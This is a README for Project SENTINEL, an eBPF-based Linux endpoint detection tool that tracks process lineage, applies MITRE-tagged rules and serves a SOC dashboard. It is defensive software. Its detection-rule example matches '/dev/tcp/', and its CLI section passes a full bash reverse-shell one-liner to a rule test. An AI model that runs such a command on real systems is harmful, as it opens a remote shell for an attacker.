# Project SENTINEL

**Process-lineage endpoint detection and response for Linux, built on eBPF.**

![Platform](https://img.shields.io/badge/platform-Linux%20x86__64-informational)
![Kernel](https://img.shields.io/badge/kernel-5.8%2B%20(BTF)-blue)
![eBPF](https://img.shields.io/badge/eBPF-tracepoints%20%2B%20LSM-orange)
![Python](https://img.shields.io/badge/python-3.10%2B-3776AB)
![Version](https://img.shields.io/badge/version-1.0.0-lightgrey)
![Status](https://img.shields.io/badge/status-alpha-red)

Project SENTINEL judges a process by **who launched it**, not only by what it looks like. Every `execve` is tagged with a 64-bit lineage ID chained to its parent's ID, so a rogue shell spawned by a web server stands out from the legitimate process tree around it. Detection runs from a small kernel-side eBPF program, a userspace agent applies rules and enforcement, and a hub serves a live SOC dashboard.

---

## Contents

- [How it works](#how-it-works)
- [Features](#features)
- [Architecture](#architecture)
- [Requirements](#requirements)
- [Installation](#installation)
- [Configuration](#configuration)
- [Detection rules](#detection-rules)
- [Learn vs. Enforce](#learn-vs-enforce)
- [Allowlist](#allowlist)
- [Hub API](#hub-api)
- [Dashboard](#dashboard)
- [CLI](#cli)
- [Project layout](#project-layout)
- [Development and testing](#development-and-testing)
- [Status and known limitations](#status-and-known-limitations)
- [Production notes](#production-notes)
- [License and author](#license-and-author)

---

## How it works

```
lineage_id = hash(parent_lineage_id, binary_path, uid, timestamp_ns)
```

1. **Trace.** Tracepoints on `execve` / `execveat` compute a lineage ID for each new process from its parent's ID and store it in a kernel LRU map (`pid → lineage entry`).
2. **Chain.** Each entry records `parent_lineage_id`, so the process tree can be rebuilt at any point. A process whose parent was never seen is flagged as anonymous.
3. **Enforce in the kernel.** If a parent's lineage ID is in the `blocked_lineages` map, the new process receives `SIGKILL` from the `execve` tracepoint, and the `bprm_check_security` LSM hook denies the exec with `EPERM`.
4. **Decide in userspace.** The agent drains the ring buffers, rebuilds the tree, and evaluates the YAML rules in order. The first match wins and triggers its action (`LOG`, `ALERT`, `KILL`, `BLOCK`, `QUARANTINE`).
5. **Report.** Events stream to the hub over HTTP and appear on the dashboard in real time.

---

## Features

**Kernel (eBPF)**
- Tracepoints: `sys_enter_execve`, `sys_enter_execveat`, `sys_exit_execve`, `sys_enter_connect`, `sys_enter_openat`, `sys_enter_sendmsg`, `sched_process_exit`
- LSM hooks: `bprm_check_security`, `task_kill`, `file_open`, `bpf`, `kernel_module_request`, `kernel_read_file`
- Maps: lineage LRU maps (65,536 entries), `blocked_lineages`, `trusted_binaries`, per-PID DNS and data-volume counters, and five ring buffers (exec, connect, file, alert, ICMP)
- CO-RE source (`vmlinux.h` + libbpf helpers) plus a legacy BCC source

**Agent**
- 74 detection rules with MITRE ATT&CK tags (see [Detection rules](#detection-rules))
- Actions: log, alert, kill process and children, block lineage, quarantine
- Learn mode that downgrades every enforcing action to a log entry
- HMAC-verified allowlist sync from the hub
- Periodic anomaly checks for DNS query rate and data volume

**Hub and dashboard**
- Flask API with a Server-Sent Events live feed
- SQLite (WAL) storage for events, lineage history, allowlist, audit log and users
- Login with scrypt-hashed passwords, signed session cookies, CSRF tokens on mode and allowlist changes, and per-IP login throttling
- Lineage force-graph (D3, bundled offline), severity filters, keyboard-first triage and a command palette
- Optional Telegram notifications and a Prometheus-format `/metrics` endpoint

---

## Architecture

```
┌──────────────────────────── Linux host ─────────────────────────────┐        ┌──────────── Hub ────────────┐
│                                                                      │        │                             │
│  Kernel: eBPF tracepoints + LSM hooks                                │        │  Flask API  ·  SSE stream   │
│   lineage_map · lineage_by_id · blocked_lineages · trusted_binaries  │        │  SQLite (WAL)               │
│   ring buffers: exec · conn · file · alert · icmp                    │        │  SOC dashboard (:5000)      │
│            │                                      ▲                  │ events │  Telegram · /metrics        │
│            ▼                                      │ map updates      │ ─────▶ │                             │
│  Agent (Python + BCC): tree builder · rule engine · kill / block     │ ◀───── │  mode (learn/enforce)       │
│                                                                      │  poll  │  signed allowlist           │
└──────────────────────────────────────────────────────────────────────┘        └─────────────────────────────┘
```

| Component | Path | Role |
|---|---|---|
| eBPF programs | `ebpf/` | Lineage generation, kernel-side blocking, event emission |
| Agent | `agent/sentinel_lineage_agent.py` | Rule engine, enforcement, telemetry, anomaly checks |
| Hub | `collector/sentinel_hub_lineage.py` | API, SSE feed, persistence, alerts, dashboard hosting |
| Auth and storage | `collector/sentinel_auth.py` | SQLite schema, passwords, sessions, CSRF, signed allowlist |
| Dashboard | `collector/index.html`, `dashboard.js` | SOC UI (no CDN dependencies) |
| Rules and policy | `config/` | `rules.yaml`, `geo_rules.json`, `trusted_binaries.json` |
| Tooling | `tools/` | `sentinelctl.py`, `validate_rules.py`, `simulate_attacks.py` |

More detail: [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md).

---

## Requirements

| Component | Needs |
|---|---|
| Hub | Python 3.10+, Flask, 256 MB RAM. Runs on any OS Python supports. |
| Agent | x86_64 Linux, kernel 5.8+ (BPF ring buffer) with BTF (`CONFIG_DEBUG_INFO_BTF=y`), root, BCC bindings (distro package), clang/llvm, kernel headers |
| LSM hooks | `CONFIG_BPF_LSM=y` and `bpf` in the kernel's boot-time `lsm=` list |

The bundled `vmlinux.h` and the Makefile target x86_64.

---

## Installation

### Installer (recommended)

```bash
git clone https://github.com/SWITCHER-X/sentinel.git
cd sentinel
sudo ./install.sh              # hub + eBPF agent
sudo ./install.sh --hub-only   # dashboard and collector only
```

The installer detects apt, dnf/yum or pacman, creates a `sentinel` system user, installs to `/opt/sentinel`, keeps state in `/var/lib/sentinel` and configuration in `/etc/sentinel`, generates secrets, and enables the systemd services. The dashboard password is printed once.

Open `http://<host>:5000/` and sign in as `admin`.

To rotate the dashboard password: `sudo ./install.sh --reset-credentials`.

### Run from source (development)

```bash
make install-deps    # distro packages (apt / dnf / pacman)
make build           # compile the CO-RE eBPF object
make run-hub         # terminal 1: hub + dashboard on :5000
make run-agent       # terminal 2: agent (root)
```

When `SENTINEL_ADMIN_PASSWORD` is unset, the hub prints a one-time credential at start-up and rotates it on every restart.

### Uninstall

```bash
sudo /opt/sentinel/uninstall.sh          # keeps config and state
sudo /opt/sentinel/uninstall.sh --purge  # removes everything
```

---

## Configuration

Settings live in `/etc/sentinel/sentinel.env` (created from [`.env.example`](.env.example)). Restart after changes: `sudo systemctl restart sentinel-hub sentinel-agent`.

| Variable | Purpose | Default |
|---|---|---|
| `SENTINEL_PORT` | Hub port | `5000` |
| `SENTINEL_COLLECTOR_URL` | Where the agent ships events | `http://127.0.0.1:5000/api/v1/telemetry` |
| `SENTINEL_ADMIN_USER` / `SENTINEL_ADMIN_PASSWORD` | Dashboard credentials | generated by the installer |
| `SENTINEL_AGENT_KEY` | Agent enrollment key (`X-Sentinel-Key`) | generated by the installer |
| `SENTINEL_SESSION_SECRET` | Session and CSRF signing secret | generated by the installer |
| `SENTINEL_ALLOWLIST_KEY` | HMAC key for the signed allowlist | generated by the installer |
| `SENTINEL_DB_PATH` | SQLite database | `/var/lib/sentinel/sentinel.db` |
| `SENTINEL_CONFIG` | Rules file | `/etc/sentinel/rules.yaml` |
| `SENTINEL_GEO_RULES` | Geo allow/block/monitor lists | `/etc/sentinel/geo_rules.json` |
| `SENTINEL_TRUSTED` | Trusted-binary file | `/etc/sentinel/trusted_binaries.json` |
| `TELEGRAM_BOT_TOKEN` / `TELEGRAM_CHAT_ID` | Optional notifications | unset |

---

## Detection rules

Rules live in `config/rules.yaml`, are tagged with MITRE ATT&CK techniques, and are evaluated in file order (first match wins).

```yaml
- id: 1003
  name: "Reverse Shell - /dev/tcp/"
  pattern: "/dev/tcp/"
  action: "KILL"          # LOG | ALERT | KILL | BLOCK | QUARANTINE
  severity: "CRITICAL"    # INFO | LOW | MEDIUM | HIGH | CRITICAL
  mitre: ["T1059.004"]
  tags: ["reverse-shell", "initial-access"]
  flags: 3                # REGEX | CMDLINE
```

**Flags** (bitmask)

| Bit | Name | Meaning |
|---|---|---|
| 1 | `REGEX` | Treat `pattern` / `binary_pattern` as regular expressions |
| 2 | `CMDLINE` | Match `pattern` against the command line |
| 4 | `BINARY` | Match `binary_pattern` against the executable path |
| 8 | `LINEAGE` | Match a specific `lineage_id` |
| 16 | `UID_RANGE` | Restrict to `uid_min`–`uid_max` |
| 32 | `NETWORK` | Network-event rule |
| 64 | `FILE_WRITE` | File-integrity rule |

**Coverage** (74 rules)

| IDs | Category |
|---|---|
| 1xxx | Reverse shells, web shells |
| 2xxx | Download-and-execute, encoded payloads |
| 3xxx | Credential access (shadow, SSH keys, cloud CLIs) |
| 4xxx | Privilege escalation, persistence, kernel modules |
| 5xxx | Defense evasion, log tampering, rootkit indicators |
| 6xxx | Discovery, cloud metadata access |
| 7xxx | Lateral movement, remote exploitation tools |
| 8xxx | Collection |
| 9xxx / 10xxx | C2, tunneling, geo-blocking, exfiltration |
| 11xxx | Ransomware, disk wiping, service tampering |
| 12xxx | Container escape, Kubernetes abuse |
| 13xxx | Crypto-mining |
| 14xxx | Package-manager abuse, binary integrity |
| 15xxx | PCI-DSS / HIPAA / GDPR data-access patterns |
| 16xxx | File-integrity monitoring |

Validate before deploying:

```bash
python3 tools/validate_rules.py config/rules.yaml
```

---

## Learn vs. Enforce

The header badge on the dashboard toggles the global mode. The agent polls the hub every 30 seconds.

- **Learn**: everything is logged and alerted, nothing is killed. Start here and watch what your hosts normally do.
- **Enforce**: rules with `KILL`, `BLOCK` or `QUARANTINE` actions take effect.

Always validate a new rule set in Learn mode on a disposable VM before enabling Enforce on a real host.

---

## Allowlist

The hub owns a three-tier allowlist (`hash` / `publisher` / `lineage`) and distributes it to agents as an **HMAC-SHA256-signed blob**. Agents verify the signature before applying it, so reaching the hub's HTTP port is not enough to inject trust. Revocations propagate on the next 60-second poll.

```bash
curl -X POST http://localhost:5000/api/v1/allowlist \
  -H "X-CSRF-Token: $CSRF" -H "Content-Type: application/json" \
  -b "sentinel_session=$SESSION" \
  -d '{"tier":"hash","value":"<sha256>","label":"our nginx build"}'
```

---

## Hub API

All `/api/v1/*` routes require a dashboard session or the agent key, except where noted.

| Endpoint | Method | Purpose |
|---|---|---|
| `/api/v1/login`, `/api/v1/logout` | POST | Session management |
| `/api/v1/csrf` | GET | CSRF token for the current session |
| `/api/v1/telemetry` | GET / POST | Query or ingest events |
| `/api/v1/stream` | GET | Server-Sent Events live feed |
| `/api/v1/stats` | GET | Counters (no auth) |
| `/api/v1/lineage`, `/api/v1/lineage/<id>` | GET | Lineage trees (IDs are 0x-hex strings) |
| `/api/v1/lineage/<id>/block`, `/trust` | POST | Mark a lineage blocked or trusted |
| `/api/v1/mode` | GET / POST | Learn or enforce (POST needs session + CSRF) |
| `/api/v1/allowlist` | GET / POST / DELETE | Signed allowlist (mutations need session + CSRF) |
| `/api/v1/agent/commands` | GET | Signed directive for agents: mode, operator commands, allowlist (agent key) |
| `/api/v1/rules`, `/api/v1/geo` | GET / POST | Rule and geo policy |
| `/health`, `/metrics` | GET | Health check and Prometheus metrics (no auth) |

---

## Dashboard

`j` / `k` navigate · `Enter` lineage detail · `/` search · `1`–`8` severity filters · `9` all · `Ctrl+K` command palette · `Ctrl+T` theme · `b` block lineage · `t` trust · `e` export JSON · `r` refresh

---

## CLI

```bash
python3 tools/sentinelctl.py status
python3 tools/sentinelctl.py rules validate --file /etc/sentinel/rules.yaml
python3 tools/sentinelctl.py lineage list
python3 tools/sentinelctl.py test rule --command "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
python3 tools/sentinelctl.py maintenance backup
```

Run `sentinelctl.py --help` for the full command set.

---

## Project layout

```
.
├── agent/            userspace agent (rules, enforcement, telemetry)
├── collector/        hub, auth/storage, dashboard (HTML/JS), login page
├── config/           rules.yaml, geo_rules.json, trusted_binaries.json, enterprise.yaml (schema draft)
├── deploy/           systemd units, remote-test and cloud bootstrap scripts
├── demo/             live attack demo script and run sheet
├── docs/             ARCHITECTURE.md, DEPLOYMENT_GUIDE.md
├── ebpf/             sentinel_lineage_core.bpf.c (CO-RE), sentinel_lineage.bpf.c (legacy), vmlinux.h
├── tests/            test_lineage.py, test_auth_db.py
├── tools/            sentinelctl.py, validate_rules.py, simulate_attacks.py
├── install.sh · uninstall.sh · Makefile · Dockerfile · requirements.txt
└── VERSION
```

---

## Development and testing

```bash
make test                          # lineage logic tests
python3 tests/test_auth_db.py      # auth, sessions, allowlist, SQLite
make verify                        # clang syntax check of the eBPF source
sudo make kernel-test              # load the object on this kernel: verifier, lineage, argv capture, blocking
make package                       # dist/sentinel-lineage-edr-<version>.tar.gz
```

To exercise the dashboard without an agent, load synthetic events into a running hub:

```bash
python3 tools/simulate_attacks.py 200
```

Test only on machines you own or are authorized to test. `demo/attack.sh` runs real attack patterns against the local sensor.

---

## Status and known limitations

Project SENTINEL is **alpha** software (v1.0.0), developed and tested on a single-host Arch Linux setup. Treat it as a research and learning platform, and do not rely on it as your only defense. Known gaps in this version:

- **Loader:** the agent compiles eBPF through BCC at start-up; the CO-RE object produced by `make build-core` is not loaded by the agent yet.
- **Kernel trust map:** in-kernel allowlisting and `task_kill` self-protection are not active yet — the kernel keys on a hash of the path string while the agent inserts the first 8 bytes of the file's SHA-256, so the two never match.
- **Unblock:** operator blocks from the dashboard are pushed to the agent (signed directive, applied in Enforce mode); there is no unblock command yet.
- **Network detectors:** geo-blocking, DNS-rate, ICMP and data-volume checks are partial (`data_volume` counts `sendmsg` calls, not bytes; nothing emits `icmp_events`).
- **Hub scale:** state is held behind a pluggable backend (`collector/state.py`). In-memory is the default and is still single-process — run one gunicorn worker. Set `SENTINEL_REDIS_URL` to move state into Redis and scale workers. A 10,000-event buffer and per-event persistence still bound throughput.

---

## Production notes

- Put the hub behind a TLS-terminating reverse proxy (nginx or Caddy). The built-in server speaks plain HTTP.
- Set `SENTINEL_SESSION_SECRET`, `SENTINEL_ALLOWLIST_KEY`, `SENTINEL_AGENT_KEY` and `SENTINEL_ADMIN_PASSWORD` explicitly — the hub refuses to start without them. The installer generates them for you.
- Restrict the hub port to your management network.

### Hub scaling — two modes

State (telemetry ring, SSE delivery, lineage trees, block/trust sets, login
throttle, runtime mode) lives behind `collector/state.py`. Which backend you get
decides how many gunicorn workers you may run.

| Mode | Env | Workers | Command |
|---|---|---|---|
| **Single-node** (default) | `SENTINEL_REDIS_URL` unset | **exactly 1** | `gunicorn -w 1 --threads 8 -b 0.0.0.0:5000 sentinel_hub_lineage:app` |
| **Multi-worker** | `SENTINEL_REDIS_URL=redis://…` | 4+ | `gunicorn -w 4 --threads 8 -b 0.0.0.0:5000 sentinel_hub_lineage:app` |

In single-node mode a second worker would hold a *separate* copy of state, so
`-w 1` is mandatory. With Redis, every worker reads and writes the same state:
SSE streams are consistent, the runtime mode is shared, and login throttling is
enforced once across the fleet instead of per worker. Redis support needs
`pip install redis`.

---

## License and author

Copyright © 2026 Ayuba Charles Medugu. All rights reserved. The source is published for review and evaluation. Contact the author about any other use.

**Author:** Ayuba Charles Medugu · [github.com/SWITCHER-X](https://github.com/SWITCHER-X) · [switcher.is-a.dev](https://switcher.is-a.dev)